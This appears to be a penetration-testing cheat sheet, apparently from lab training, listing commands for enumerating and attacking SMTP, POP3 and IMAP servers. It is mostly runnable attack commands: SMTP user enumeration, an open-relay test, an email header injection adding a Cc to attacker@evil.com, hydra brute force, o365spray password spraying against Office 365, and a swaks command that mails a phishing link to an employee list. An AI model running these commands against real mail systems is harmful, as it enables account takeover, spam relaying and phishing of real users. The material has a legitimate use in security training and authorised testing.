# Mail Protocols Enumeration and Exploitation Technique

---

# Mail Protocols

<img width="1012" height="456" alt="image" src="https://github.com/user-attachments/assets/aeaaac44-2df9-47b0-b468-e56ad55c1cc6" />


# Enumeration

```bash
sudo nmap -Pn -sV -sC -p25,143,110,465,587,993,995 --script smtp-commands,smtp-enum-users,smtp-open-relay 10.129.14.128
nmap -p25 -Pn --script smtp-open-relay 10.10.11.213

# SMTP Connected
telnet 10.10.110.20 25
nc smtp.target.com 25

# Server & Banner Enumeration
EHLO test.com
HELO test.com
VRFY root
VRFY admin
VRFY postmaster
EXPN mailinglist
EXPN all
RCPT TO: <root>
RCPT TO: <admin>
QUIT

# User Enumeration (VRFY/EXPN/RCPT)
USER root
VRFY root
VRFY admin
VRFY administrator
VRFY webmaster
VRFY postmaster
VRFY abuse
VRFY guest

EXPN help
EXPN support
EXPN sales

RCPT TO: <root@target.com>
RCPT TO: <admin@target.com>
QUIT

# Open Relay Test
HELO test.com
MAIL FROM: test@test.com
RCPT TO: external@gmail.com
DATA
Subject: Relay Test
Test relay
.
QUIT

# Email Injection Test
HELO test.com
MAIL FROM: <test@test.com>
RCPT TO: <victim@target.com>
DATA
To: victim@target.com
Cc: attacker@evil.com
Subject: Test
Line 1
Line 2
.
QUIT

# Brute Force
smtp-user-enum -M RCPT -U userlist.txt -D inlanefreight.htb -t 10.129.203.7
hydra -L users.txt -p 'Company01!' -f 10.10.110.20 pop3
hydra -l "marlin@inlanefreight.htb" -P passwords.list -f inlanefreight.htb pop3   
python3 o365spray.py --spray -U usersfound.txt -p 'March2022!' --count 1 --lockout 1 --domain msplaintext.xyz

# Cloud Enumeration
python3 o365spray.py --validate --domain msplaintext.xyz
python3 o365spray.py --enum -U users.txt --domain msplaintext.xyz

# Swaks
swaks --from notifications@inlanefreight.com --to employees@inlanefreight.com --header 'Subject: Company Notification' --body 'Hi All, we want to hear from you! Please complete the following survey. http://mycustomphishinglink.com/' --server 10.10.11.213
```
